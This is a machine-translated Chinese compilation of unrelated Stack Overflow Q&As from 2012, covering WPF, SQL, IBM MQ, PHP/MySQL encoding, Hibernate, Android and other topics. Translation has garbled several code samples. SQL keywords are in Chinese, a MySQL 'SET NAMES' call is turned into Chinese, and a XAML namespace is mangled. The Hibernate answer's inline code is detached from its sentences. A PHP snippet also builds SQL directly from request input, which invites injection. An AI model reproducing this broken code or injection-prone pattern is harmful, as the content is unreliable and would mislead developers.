            var bi = FromUrl("http://www.dynamicdrive.com/dynamicindex4/lightbox2/horses.jpg", Environment.CurrentDirectory);

            if (bi.Format != PixelFormats.Pbgra32)
                bi = BitmapFactory.ConvertToPbgra32Format(bi);

            WriteableBitmap wrb = new WriteableBitmap(bi);

            foreach (var stroke in ink.Strokes)
            {
                foreach (var point in stroke.StylusPoints)
                {
                    wrb.DrawLine((int)point.X, (int)point.Y, (int)(point.X + 1), (int)(point.Y + 1), Colors.Red);
                }
            }

            var encoder = new JpegBitmapEncoder();
            BitmapFrame frame = BitmapFrame.Create(wrb);
            encoder.Frames.Add(frame);

            using (var stream = File.Create("result.jpg"))
            {
                encoder.Save(stream);
            }

        }

        public static BitmapSource FromUrl(string url, string workingPath)
        {
            string[] strArr = url.Split(new char[] { '/' });
            string file = workingPath + "\\" + strArr[strArr.Length - 1];
            if (!File.Exists(file))
            {
                using (WebClient client = new WebClient())
                {
                    client.DownloadFile(url, file);
                }
            }
            return BitmapImageFromFile(file);
        }

        public static BitmapSource BitmapImageFromFile(string file)
        {
            BitmapImage bi = new BitmapImage();
            try
            {
                bi.BeginInit();
                bi.CacheOption = BitmapCacheOption.OnLoad;
                bi.CreateOptions = BitmapCreateOptions.IgnoreImageCache;
                bi.UriSource = new Uri(file, UriKind.RelativeOrAbsolute);
                bi.EndInit();
            }
            catch { return ToBitmapSource(System.Drawing.Bitmap.FromFile(file)); }
            return bi;
        }

        public static BitmapSource ToBitmapSource(System.Drawing.Image bitmap)
        {
            using (MemoryStream stream = new MemoryStream())
            {
                bitmap.Save(stream, System.Drawing.Imaging.ImageFormat.Jpeg);
                stream.Position = 0;
                BitmapImage result = new BitmapImage();
                result.BeginInit();
                result.CacheOption = BitmapCacheOption.OnLoad;
                result.StreamSource = stream;
                result.EndInit();
                result.Freeze();

                return result;
            }
        }
    }
} 
```

XAML：

```
<Window x:Class="TestApp.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="MainWindow"
        Height="350" Width="525">
    <Grid>
        <Image Source="http://www.dynamicdrive.com/dynamicindex4/lightbox2/horses.jpg" 
               Name="img"/>
        <InkCanvas Background="Transparent" 
                   Name="ink"/>
        <Button Content="Save" 
                HorizontalAlignment="Left"  
                VerticalAlignment="Top" 
                Margin="5" 
                Click="SaveImage"/>
    </Grid>
</Window> 
```

也许你会找到一种更好的方法来使用这个扩展在 WriteableBitmap 上绘图，我使用的绘图方法只是一个实验。

# sql - SQL 查询优化 - 降低服务器速度

> ID：11782360
> 
> 赞同：0
> 
> 时间：2012-08-02T17:02:40.303
> 
> 标签：sql, performance, optimization

我维护的系统似乎每隔几天就会变慢一点，我认为它来自某个地方的错误查询。

据我所知，我已将问题缩小到一两页。这是我认为导致问题的页面上的查询。

```
select a.s_purchase_order as order_id, a.order_type, a.nobackorder, a.order_note, a.note, a.rqst_dlvry_date, b.customer_name ,c.store_name,(c.store_name + ',' + isnull(c.address1 + ',', ' ') +  isnull(c.city + ',', ' ') +  isnull(c.state_cd+ ',', ' ')  + isnull( c.zipcode, ' ')) as store_info, d.supplier_account
from VW_CustomerOrder a, Customer b, Store c, eligible_supplier d
where a.customer = c.customer
and a.store = c.store
and a.customer = b.customer
and c.customer *= d.customer
and c.store *= d.store
and a.supplier *= d.supplier
and a.purchase_order = @order_id
and a.customer = @customer_id
and a.store=@store_id
and a.supplier = @supplier_id 
```

是否有明显的东西会非常慢或导致系统随着时间的推移而变慢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T17:17:10.137

怎么样做一些内部连接来解决这个问题，检查你的基础并查看这些表的索引和外键，这对查询和性能总是有帮助的

```
选择
  a.columun_a，b.column_a 来自 table_a
a.id = b.id 上的内部连接 ​​table_b b
在哪里
  b.column_b = "某个值"

```

# ibm-mq - WebSphere MQ 接收器通道已暂停

> ID：11782363
> 
> 赞同：3
> 
> 时间：2012-08-02T17:02:45.590
> 
> 标签：ibm-mq

我想我试图启动一个已经在运行的频道或其他什么。每当我启动发送方通道时，接收方通道就会进入暂停状态。[我查了一下](http://www-01.ibm.com/support/docview.wss?uid=swg21080140)，发现有关 AdoptNewMCA 配置的一些信息，不知道如何在队列管理器级别进行设置。我该如何顺利解决这个问题。仅仅停止和重新启动频道并不能做到这一点。

错误日志说：

```
/02/2012 12:38:41 PM - Process(19161.269) User(mqm) Program(amqrmppa)
                    Host() Installation(Installation1)
                    VRMF(7.1.0.0) QMgr(QM_TEST2)

AMQ9514: Channel 'QM_TEST1.TO.QM_TEST2' is in use.

EXPLANATION: The requested operation failed because channel
''QM_TEST1.TO.QM_TEST2' is currently active. ACTION: Either end the channel
manually, or wait for it to close, and retry the operation.
----- amqrcsia.c : 1042 ------------------------------------------------------- 
08/02/2012 12:38:41 PM - Process(19161.269) User(mqm) Program(amqrmppa)
                    Host(...) Installation(Installation1)
                    VRMF(7.1.0.0) QMgr(QM_TEST2)

AMQ9999: Channel ''QM_TEST1.TO.QM_TEST2' to host '17.2.33.44' ended abnormally.

EXPLANATION: The channel program running under process ID 19161 for
channel ''QM_TEST1.TO.QM_TEST2' ended abnormally. The host name is
'17.2.33.44'; in some cases the host name cannot be
determined and so is shown as '????'. ACTION: Look at previous error
messages for the channel program in the error logs to determine the
cause of the failure. Note that this message can be excluded
completely or suppressed by tuning the "ExcludeMessage" or
"SuppressMessage" attributes under the "QMErrorLog" stanza in qm.ini.
Further information can be found in the System Administration Guide.
----- amqrmrsa.c : 887 -------------------------------------------------------- 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T17:59:37.587

在查找这些内容时，我会先从产品手册开始。在这种情况下，关于通道状态的信息中心主题[表示](http://pic.dhe.ibm.com/infocenter/wmqv7/v7r5/topic/com.ibm.mq.doc/ic11230_.htm)处于 PAUSED 状态的通道正在等待重试间隔。关于通道错误的[子主题](http://pic.dhe.ibm.com/infocenter/wmqv7/v7r5/topic/com.ibm.mq.doc/ic11270_.htm)解释了为什么发送或接收通道可以重试：

> 如果通道由于队列已满或禁止放置而无法将消息放入目标队列，则通道可以按时间间隔重试操作多次（在消息重试计数属性中指定）（在消息重试间隔属性）。或者，您可以编写自己的消息重试出口，以确定哪些情况会导致重试，以及尝试的次数。通道在等待消息重试间隔完成时进入 PAUSED 状态。

因此，如果您停止频道，您应该会在发送方的 XMitQ 中看到一条消息。如果您启用该队列，您可以浏览消息，查看标题并查看它的目的地是哪个队列。在接收端，查看该队列是否已满。

经典的快速发送者，缓慢的消费者问题。如果消费者跟不上，消息在接收 QMgr 上备份，然后通道重试并开始在发送 QMgr 上备份。必须监控请求队列的深度和输入句柄。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-08-16T15:57:21.440

确保设置了 DLQ。

尝试将消息重试计数减少到 1 以加快 DLQ 的使用。

# c# - .gics 缺少使用 Telerik 控件的语句

> ID：11782365
> 
> 赞同：0
> 
> 时间：2012-08-02T17:02:49.840
> 
> 标签：c#, .net-4.0, silverlight-5.0

我继承了一个使用 Telerik 控件的 Silverlight 应用程序。我对 Silverlight 很陌生，所以接下来是一个菜鸟问题。尝试构建解决方案时，我收到 Telerik 控件的 name could not be found 错误。当我查看 *.gics 文件时，自动生成的文件中缺少“使用 Telerik.Windows.Controls”。当然，如果我直接进行更改，那么在我进行构建时它会被覆盖。如何告诉 Silverlight 在生成 .gics 文件时包含 Telerik using 语句？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-03T22:05:13.787

解决方法是将其包含在您的控件中：

xmlns:input="clr-命名空间 ystem.Windows.Controls;assembly=System.Windows.Controls.Data.Input"

# wpf - 想要一个可视化 XAML 层次结构的工具，试过 XAMLPadX 有问题

> ID：11782372
> 
> 赞同：2
> 
> 时间：2012-08-02T17:03:46.363
> 
> 标签：wpf, xaml

我想要一个工具来可视化 XAML 文件的视觉层次结构 - 只是概述哪些元素在哪些其他元素中。

我下载了 XAMLPadX 4.0 并打开了一个 GridSplitter 示例文件：

```
<Window x:Class="GridsplitterSample.Window1"
xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
Title="GridSplitter Sample" Height="400" Width="700">
    <Grid>
        <Grid.RowDefinitions>
            <RowDefinition></RowDefinition>
        </Grid.RowDefinitions>
        <Grid.ColumnDefinitions>
            <ColumnDefinition></ColumnDefinition>
            <ColumnDefinition></ColumnDefinition>
        </Grid.ColumnDefinitions>

        <GridSplitter Grid.Row="0" Grid.Column="0" HorizontalAlignment="Right" Width="4" Background="Yellow"/>
        <TextBlock Grid.Row="0" Grid.Column="0" Margin="0 0 4 0" Background="LightGray">Text Block</TextBlock>
        <TextBlock Grid.Row="0" Grid.Column="1" Background="LightGreen">Text Block 2</TextBlock>
    </Grid>
</Window> 
```

. . . 此示例在 Visual Studio 2010 中运行和构建良好，但在 XAMLPadX 中，它在主屏幕上没有显示任何内容，在 Visual Tree 窗口中，它仅扩展至外部 Grid 元素，并且没有“+”可以进一步扩展以显示内部网格、TextBlocks 或 GridSplitter。

XamlPadX 附带了示例文件，因此我加载了“Red Dragon”。它在主屏幕上显示了 XAML 和一条红龙。但现在我无法摆脱红龙！无论我加载什么其他内容，我在主窗口和可视树中看到的都是这些，即使在 XAML 窗口中加载了不同的 XAML。Red Dragon 似乎已经损坏了工具并重新评估它似乎没有任何区别。

那么我做错了什么还是有更好的工具？

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T18:27:05.037

如果您还不熟悉我所知道的其他工具，它几乎与[Expression Blend](http://www.microsoft.com/expression/products/Blend_Overview.aspx)一样方便，而且我知道通常不赞成提供只有几句话的答案。但是，一旦您习惯了在 WPF/SL Expression Blend 中使用 XAML，它就会非常好。对象/时间线和视觉属性等使开发效率更高！如果你不能说，我是一个大粉丝。

或者，如果您还没有这样做，您可以在 Visual Studio 中启用“[文档大纲”窗口](http://msdn.microsoft.com/en-us/library/46xf4h0w%28v=vs.80%29.aspx)，它还有助于可视化结构。希望这可以帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T19:52:17.290

可以使用[Snoop](https://github.com/cplotts/snoopwpf)。将附加到任何兼容的 .NET 托管应用程序，我认为它甚至可能支持某些 Silverlight 应用程序。CTRL+Shift+Mouseover 突出显示区域并在文档层次结构中显示它们。

# c# - 如何修改我的 WHILE 循环以包含 SELECT 语句中的更多列？

> ID：11782376
> 
> 赞同：0
> 
> 时间：2012-08-02T17:04:00.123
> 
> 标签：c#, vb.net

这可能很容易，但我遇到了问题。

这是sql位：

```
Dim strSQL As String = ("SELECT field1 FROM myTable WHERE key like '%' + strkey + '%'")

    While oReader.Read()
        With oReader
            Dim li As New ListItem(oReader(0).ToString())
            fday.Items.Add(li)

        End With 'end With
    End While 'End While 
```

然后在标记页面上，我有这个：

```
 <asp:CheckBoxList runat="server" ID="fday" style="text-align:center;cursor:pointer;color:blue;text-decoration:underline;" CssClass="checkAll"> 
   </asp:CheckBoxList> 
```

这工作正常。

但是，我们被要求添加更多字段，因此我们在标记页面上有额外的控件。

例如：

```
 <table>
   <tr>
    <td>
           <asp:CheckBoxList runat="server" ID="fday" style="text-align:center;cursor:pointer;color:blue;text-decoration:underline;" CssClass="checkAll"> 
   </asp:CheckBoxList>
   </td>
   <td><asp:TextBox id="tb3" runat="server" /></td>
  </tr>
 </table> 
```

这样，我们可以通过向查询中添加更多列来获得更多列数据，例如从 mytable 中选择 field1、field2 等

如何修改 WHILE 循环以在我的查询中包含其他列？

希望我的解释清楚。

非常感谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T19:58:11.437

请记住，我对您的其他代码的外观一无所知，这是我对示例的最佳猜测。

```
Dim strSQL As String = ("SELECT * FROM myTable WHERE key like '%' + strkey + '%'")

Dim i as integer
i = 0

While oReader.Read()
    With oReader
        while true
            Dim li As New ListItem(oReader(i).ToString())
            if (li is Nothing)//isNull check
                break
            else
                fday.Items.Add(li)
        End While 
    End With 
End While 
```

还有 2 件事要记住。我主要是一名 C# 程序员，所以如果这看起来很奇怪或使用了在 VB 中具有不同等价物的东西，请自行翻译。另一个，我不确定 oReader 是什么，或者如果`i`超出范围会产生什么样的行为。这段代码很可能会读入所有列，然后生成 IndexOutOfRangeException。

**----**

如果您确切知道会有多少列，那么使用具有严格界限的 for 循环比使用 while 循环更好。 `for i = 0; i < X; i++`其中 X 是您实际拥有的列数。

**----**

现在，我们遇到的一个大问题是，您以一种奇怪的方式描述了这一点，并且您忘记了在其中添加一个 asp.Net 标记。您需要的实际上并不是一个 while 循环，它仅在您想向 fDay 添加更多列时才有效。如果您正在处理泛型，则需要创建泛型，否则您需要对所有内容进行硬编码。

```
Dim strSQL As String = ("SELECT field1, field2 FROM myTable WHERE key like '%' + strkey + '%'")

While oReader.Read()
    With oReader
        Dim li As New ListItem(oReader(0).ToString())
        fday.Items.Add(li)

        Dim txt as New TextBox()
        txt.Text = oReader(1).ToString()
        //store txt somewhere permanent?
    End With 'end With
End While 'End While 
```

我假设这更像你想要的。如果这也不是，请更具体地了解您正在处理的数据结构以及每行数据实际包含的内容。您可能（可能）需要一个不同的 fDay 数据结构来保存新数据，以便每条记录显示所有字段而不仅仅是 1。

# iphone - 在通知上更新表格单元格

> ID：11782377
> 
> 赞同：0
> 
> 时间：2012-08-02T17:04:02.690
> 
> 标签：iphone, objective-c, ios5

如何在收到特定通知时更新表格视图单元格，而无需重新加载表格数据。通知告诉我需要更新的单元格的 ID。所以我想迭代所有表格单元格并只更新相关的表格单元格而不重新加载它。我怎样才能做到这一点

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T17:41:00.110

用于`[tableView visibleCells]`获取显示的所有单元格的列表。遍历此数组以查看是否显示了您需要更新的单元格，然后执行您需要的任何操作。（此方法适用于您重复使用单元格的情况）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T18:23:43.957

您可以只使用内置`reloadRowsAtIndexPaths:withRowAnimation:`而不是试图篡夺框架的功能。这将有效地仅重新加载您要求它的单元格两个而不是整个表格甚至整个部分。

> 使用某种动画效果重新加载指定的行。
> 
> 重新加载一行会导致表视图向其数据源询问该行的新单元格。该表在为旧行设置动画时为该新单元格设置动画。如果要提醒用户单元格的值正在更改，请调用此方法。但是，如果通知用户并不重要——也就是说，您只想更改单元格显示的值——您可以获取特定行的单元格并设置其新值。
> 
> 当在由 beginUpdates 和 endUpdates 方法定义的动画块中调用此方法时，它的行为类似于 deleteRowsAtIndexPaths:withRowAnimation:。UITableView 传递给方法的索引在任何更新之前在表视图的状态中指定。无论动画块中的插入、删除和重新加载方法调用的顺序如何，都会发生这种情况。
> 
> 在 iOS 3.0 及更高版本中可用。

# php - 选择阿拉伯字符会在 MYSQL 中产生问号。怎么修？

> ID：11782379
> 
> 赞同：2
> 
> 时间：2012-08-02T17:04:16.677
> 
> 标签：php, mysql, select, encoding, arabic

阿拉伯字符的`select`语句返回`?????`.. 为什么？

php代码：

```
<?php

    require_once("db.php");
    $code=$_GET["code"];
    $query = "SELECT id,name,price,code from metro_goods where code=$code";

    $result = mysql_query($query) or die(mysql_error());

    $arr=array();
    $i=0;

    while ($row = @mysql_fetch_assoc($result)){
        $arr[$i]=array("id"=>$row['id'],"name"=>$row['name'],"price"=>$row["price"],"code"=>$row["code"]);
        $i++;
    }
        echo json_encode(array("data"=>$arr));
 ?> 
```

结果 ：

```
{"data":[{"id":"55121","name":"???? ??? ????? - ???","price":"16","code":"42217572"}]} 
```

编辑：

设置字符集时

```
$rating_conn = mysql_connect($rating_dbhost, $rating_dbuser, $rating_dbpass) or die  ('Error connecting to mysql');
    mysql_set_charset('utf8',$rating_conn); 
```

输出变为：

```
{"data":[{"id":"55121","name":"\u0645\u0632\u064a\u0644 \u0639\u0631\u0642 \u0646\u064a\u0641\u064a\u0627 - \u0633\u062a\u0643","price":"16","code":"42217572"}]} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-06T11:41:15.370

在进行任何查询之前，您必须使用以下查询语句将字符集编码分配给 UTF8：

mysql_query("设置名称 utf8");

# hibernate - Hibernate EntityManager：如何删除关联

> ID：11782380
> 
> 赞同：0
> 
> 时间：2012-08-02T17:04:17.340
> 
> 标签：hibernate, many-to-many, associations, entitymanager

o 一些惯用的说明以便更好地理解：*capa*表示**层**，*mapa*表示**地图**

o 一个图层可能用于不同的地图，一个地图可能包含许多不同的图层

o 删除图层时，与地图的关联必须消失，但地图本身仍然存在。

o 相反，当您删除地图时，与图层的关联必须消失，但图层本身仍然存在。

o 映射代码：

```
@Entity
@Table(name = "CAPA")
public class Capa implements Serializable {    
    @ManyToMany(fetch=FetchType.LAZY, mappedBy="capas")
    private Set<Mapa> mapas;
} 
```

和

```
@Entity
@Table(name = "MAPA")
public class Mapa implements Serializable {
    @ManyToMany(fetch=FetchType.LAZY)
    @JoinTable(name="mapa_capa", joinColumns={@JoinColumn(name="idMapa")}, inverseJoinColumns={@JoinColumn(name="idCapa")}) 
    private Set<Capa> capas;
} 
```

o 要删除图层（capa）与其地图（mapas）之间的链接，我尝试过：

```
Capa c = findCapa();
Iterator<Mapa> itms = c.getMapas().iterator();        
while (itms.hasNext()) {
    Mapa m = itms.next(); 
    m.getCapas().remove(c);
    c.getMapas().remove(m);
    getEntityManager().refresh(m);                
    getEntityManager().refresh(c);   
} 
```

那是行不通的。两个集合（m.capas 和 c.mapas）保持不变。

感谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T22:08:19.797

你的 Capa`c`是一个对象。如果您在您的类中正确实现了和，持久性提供者只能知道`c`集合中实际存在的。否则，可能会有这样一种情况，当休眠状态永远不会知道它实际存在于中，因此永远不会真正从. 您可以通过评估 remove 调用的返回值来检查这一点。我很确定它会的。`Mapa``hashCode``equals``Capa``c``m``m.getCapas().remove(c)``c``m``false`

这里最好做的是检查对象的主键，然后`actual object`从集合中删除。

```
Capa c = findCapa();
Iterator<Mapa> itms = c.getMapas().iterator();        
while (itms.hasNext()) {
    Mapa m = itms.next();
    foreach(Capa c1 : m.getCapas()) {
      if(c1.getId().equals(c.getId())) {
        m.getCapas().remove(c1);
      }
    }
    //No need to remove m from c as Mapa is the owning side
    getEntityManager().refresh(m);                
    getEntityManager().refresh(c);   
} 
```

然而，这有一个额外的 for 循环。

最好的办法是在所有实体中实现`equals`和方法。`hashCode`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T17:24:31.857

您需要调用 flush 以使更改在数据库中生效。您没有调用刷新，而是调用刷新，因此数据库副本覆盖了您的更改

# ruby-on-rails - 在 Rails 中，有没有一种简单的方法可以在创建父对象的同时创建子对象？

> ID：11782391
> 
> 赞同：2
> 
> 时间：2012-08-02T17:05:00.787
> 
> 标签：ruby-on-rails, ruby-on-rails-3, ruby-on-rails-3.2

> **注意：**这个问题是由我关于使用accepts_nested_attributes_for 的[另一个问题产生的。](https://stackoverflow.com/questions/11778938/)如果需要，您可以参考该问题以获取更多上下文。

我相信这个问题最好用一个简单的例子来解释：

```
class Foo < ActiveRecord::Base
  has_many :bars, inverse_of: :foo
end

class Bar < ActiveRecord::Base
  validates :foo_id, presence: true

  belongs_to :foo, inverse_of: :bars
end

f = Foo.new()
=> #<Foo id: nil, created_at: nil, updated_at: nil>
b = f.bars.build()
=> #<Bar id: nil, foo_id: nil, created_at: nil, updated_at: nil>
f.save!
=> ActiveRecord::RecordInvalid: Validation failed: Bars foo can't be blank 
```

有没有简单的方法来解决这个问题？我知道我可以`f`先 save 然后 build `b`，但我的情况比这个例子复杂一点（参见我上面提到的问题），如果可能的话，我宁愿避免这种情况。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T17:15:00.560

子记录与父记录同时创建，这就是您的验证失败的原因，您的孩子尚未持久化。为了让它工作，我会写一个这样的自定义验证

```
class Foo < ActiveRecord::Base
  has_many :bars
  accepts_nested_attributes_for :bars, :allow_destroy => true

end

class Bar < ActiveRecord::Base
  belongs_to :foo
  validates_presence_of :bar
end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T17:11:17.953

您可以使用回调来创建对象（也许 before_save？）。见[这里](http://guides.rubyonrails.org/active_record_validations_callbacks.html)。

# version-control - Mercural ACL 组导致 502 错误

> ID：11782392
> 
> 赞同：2
> 
> 时间：2012-08-02T17:05:10.103
> 
> 标签：version-control, mercurial, permissions, internal-server-error

我正在使用 ACL 扩展设置我的 mercurial 存储库。当我配置 ACL.deny 部分时，我试图拒绝特定的用户组。当单独阻止它们时，ACL 会按预期工作并中止它们的更改集。但是，当尝试将所有这些用户添加到一个组中，然后阻止该组时，Mercurial 会给出 502 Bad Gateway 错误。

查看我的 IIS 日志时，我没有收到任何有意义的错误消息，此时基本上被卡住了。有没有人有这方面的经验，或者知道是什么原因造成的？

502 错误和组的设置有什么共同点，还是我们的 IIS 或 SSL 配置错误？我以前看过并且没有看到过这个问题的任何版本，所以我认为这不是一个反复无常的问题，而是寻求诊断方面的帮助。

# android - 启动活动后退出警报对话框

> ID：11782393
> 
> 赞同：0
> 
> 时间：2012-08-02T17:05:10.643
> 
> 标签：android, android-alertdialog

我有一个显示的方法，`AlertDialog`它有 3 `Buttons`；中性、消极和积极。

我希望中立者在我的应用程序前面打开联系人应用程序，并带有`Dialog`. 但是，即使它应该是“中立的”并且我没有发表任何声明，`Dialog`当我回到我的时候它也关闭了。`Activity``return`

这是我的代码：

```
 public static void showAddFriendDialog(Context ctx1) {
        final Context ctx = ctx1;

        //showGetFriendsFromContacts(ctx);

         // Set an EditText view to get user input 

         final EditText input = new EditText(ctx); input.setHint("name");
         final EditText input2 = new EditText(ctx); input2.setHint("firstname");
         final EditText input3 = new EditText(ctx); input3.setHint("login/email");

         // on est obligé de mettre un layout car on peut que mettre un setview
         LinearLayout layout = new LinearLayout(ctx);
         layout.setOrientation(LinearLayout.VERTICAL);

         layout.addView(input);
         layout.addView(input2);
         layout.addView(input3);

         AlertDialog.Builder builder = new AlertDialog.Builder(ctx);

         builder.setCancelable(true);
         builder.setTitle("Add a friend");
         builder.setMessage("Fill in the fields you know or get your contact info from your Contact List :");

         builder.setView(layout);

        builder.setPositiveButton("Ok", new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface dialog, int which) {

........................

            }
        });
        builder.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface dialog, int which) {
                return;
            }
        });

        builder.setNeutralButton("Contact List",
                new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int id) {

                        ctx.startActivity(new Intent(null, ContactsContract.Contacts.CONTENT_URI));

                    }

       });

        builder.setOnCancelListener(new DialogInterface.OnCancelListener() {
            public void onCancel(DialogInterface dialog) {
                return;
            }
        });

        builder.show();
    } 
```

有人知道是什么原因造成的吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T17:27:22.983

无论如何，单击按钮时，默认对话框将始终退出。

建议您实现[自定义对话框](http://developer.android.com/guide/topics/ui/dialogs.html#CustomDialog)以避免这种情况。

# foursquare - 通过 API 查找带有 twitter id 的场所

> ID：11782408
> 
> 赞同：0
> 
> 时间：2012-08-02T17:06:28.183
> 
> 标签：foursquare

我们将我们的服务集成到 4sqr，这是由我们的客户通过 4sqr URL 通知我们他们的场地 ID 来完成的。然而，如果一个场地被认领并且一个 twitter 与该场地相关联，则 url 将切换到一个带有 twitter id 的网址。

所以，在这个 twitter 账户之后的两件事之一是为场地准备好的： 1\. 如何在你的 UI 中找到场地 ID？或者 2\. 如何使用推特句柄查询场地详情？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T22:15:21.043

Foursquare 的[/users/search](https://developer.foursquare.com/docs/users/search)应该可以工作（您基本上是在搜索“场地用户”）。[https://developer.foursquare.com/docs/explore#req=users/search%3Ftwitter%3Dwinkellyauto](https://developer.foursquare.com/docs/explore#req=users/search%3Ftwitter%3Dwinkellyauto)

# c++ - 使用 Abaqus ODB C++ API 访问部件

> ID：11782417
> 
> 赞同：0
> 
> 时间：2012-08-02T17:06:54.280
> 
> 标签：c++, file-io

我正在使用 Abaqus ODB C++ API。我正在编写一个包装器来可视化 .odb 文件。

以下代码会将名为“PART-1”的部分加载到对象中`part`

```
odb_Odb& odb = openOdb( filename.c_str() );
odb_PartRepository& pr = odb.parts();
odb_Part& part = pr["PART-1"]; 
```

如果您知道零件的名称是什么，则此代码很棒，但是当我不知道零件的名称时如何访问零件？为什么 API 的作者会限制我们通过字符串进行索引？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-09T20:25:58.723

经过大量搜索，我找到了以下解决方案。

请参阅`10.10.5 Reading results data`本文档的部分： [http ://abaqus.ethz.ch:2080/v6.11/pdf_books/SCRIPT_USER.pdf](http://abaqus.ethz.ch:2080/v6.11/pdf_books/SCRIPT_USER.pdf)

您必须使用存储库迭代器来提取可能的密钥。

```
// for example:
odb_StepRepositoryIT stepIter( odb.steps() );
for (stepIter.first(); !stepIter.isDone(); stepIter.next())
{
    cout << stepIter.currentKey().CStr() << endl;
} 
```

# c# - 向其他客户端的浏览器发送文本有哪些漏洞？

> ID：11782418
> 
> 赞同：2
> 
> 时间：2012-08-02T17:06:54.703
> 
> 标签：c#, asp.net, security

我有一个正在使用 SignalR 开发的聊天应用程序。在聊天中用户发送一条消息，现在我想让它安全，这样用户就不能发送 javascript 或类似的东西。我应该注意什么（即剥离标签）？聊天不会进入数据库，它只是将消息从一个用户的文本区域中继到连接的其他用户的浏览器。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-03T07:55:39.550

基本上你想防范 XSS - 请参阅此处[https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet#Escaping_.28aka_Output_Encoding.29](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet#Escaping_.28aka_Output_Encoding.29)在“转义（又名输出编码）”下。

在源中输入的任何字符在输出到目标浏览器时都应进行 HTML 编码。这会将像`<script>`HTML 这样的序列转换为显示，例如

```
&lt;script&gt; 
```

就我个人而言，我不会打扰剥离标签，我相信输出清理是要走的路，因为这是安全的，并且可以让用户不受限制地进行最大程度的交流（如果用户想向某人发送一段代码和您的应用程序正在剥离所有 HTML 标记？）。

# asp.net-mvc-3 - ASP MVC N 层异常处理

> ID：11782420
> 
> 赞同：0
> 
> 时间：2012-08-02T17:07:00.553
> 
> 标签：asp.net-mvc-3, exception-handling

我正在编写一个服务层，它使用实体框架从数据库中获取/设置数据，然后将其传递给 MVC Web 应用程序。我无法决定将数据库错误返回到 Web 应用程序的最佳方法是什么。

我应该抛出异常并且 Web 应用程序可以相应地处理它，还是应该返回一个字符串/布尔值来传达数据库操作是否有效？

关于最佳实践的任何建议？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T17:17:19.157

您可以不在服务层中处理它们，也可以使用您将创建的异常类对它们进行规范化。例如：

```
public class DatabaseException: Exception
{
    public string TableName { get; private set; }

    public DatabaseException(string tableName, Exception innerException)
        :base("There a database error occured.", innerException)
    {
        TableName = tableName;
    }
} 
```

只需将所需的任何信息作为属性添加到异常类并在构造函数中初始化它们。

用返回值通知更高级别的异常并不是最佳实践，因为大多数方法已经返回了一些数据。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-03T17:17:21.233

您**不应该**处理从 Web 应用程序抛出的异常，让异常自然抛出，即使是从数据访问层。通过这种方式，您可以轻松进行故障排除，尤其是在生产阶段。那么，如何处理：

1.  对抛出的异常使用自定义错误页面。
2.  使用 HttpModule 记录异常以进行故障排除。[登录模块ELMAH](http://code.google.com/p/elmah/)与 ASP.NET MVC 完美配合，并允许您在 Web 上查看日志。

# oracle - 使用 pl/sql dom 解析器解析 XML 的最简单方法

> ID：11782423
> 
> 赞同：2
> 
> 时间：2012-08-02T17:07:11.647
> 
> 标签：oracle, plsql, xml-parsing, oracle-apex

我不知道如何解释，但我会尽力而为。我正在使用 Oracle Apex，并且在我的名为“CLOBTABLE”的表中有 XML，数据类型为 Clob。我已经尝试将 XMLTYPE 作为数据类型，但它不接受顶点中的任何数据，所以我目前使用 CLOB 作为数据类型。现在我想使用 xml 形式的数据，即

```
<Row>
    <cellArray>
        <Cell>
            <columnId>1</columnId>
            <valueArray>
                <Value>
                    <value>IR000024575452</value>
                </Value>
            </valueArray>
        </Cell>
        <Cell>
            <columnId>5</columnId>
            <valueArray>
                <Value>
                    <value>AZ12579856-001</value>
                </Value>
            </valueArray>
        </Cell>
        <Cell>
            <columnId>2</columnId>
            <valueArray>
                <Value>
                    <value>IT06686</value>
                </Value>
            </valueArray>
        </Cell>
        <Cell>
            <columnId>9</columnId>
            <valueArray>
                <Value>
                    <value>Hu Mics Metab K</value>
                </Value>
            </valueArray>
        </Cell>
        <Cell>
            <columnId>8</columnId>
            <valueArray>
                <Value>
                    <value>2006-03-31</value>
                </Value>
            </valueArray>
        </Cell>
        <Cell>
            <columnId>7</columnId>
            <valueArray>
                <Value>
                    <value>2006-07-27</value>
                </Value>
            </valueArray>
        </Cell>
    </cellArray>
</Row>
<Row>
    <cellArray>
        <Cell>
            <columnId>1</columnId>
            <valueArray>
                <Value>
                    <value>IR000024575452</value>
                </Value>
            </valueArray>
        </Cell>
        <Cell>
            <columnId>5</columnId>
            <valueArray>
                <Value>
                    <value>AZ12579856-001</value>
                </Value>
            </valueArray>
        </Cell>
        <Cell>
            <columnId>2</columnId>
            <valueArray>
                <Value>
                    <value>IT06686</value>
                </Value>
            </valueArray>
        </Cell>
        <Cell>
            <columnId>9</columnId>
            <valueArray>
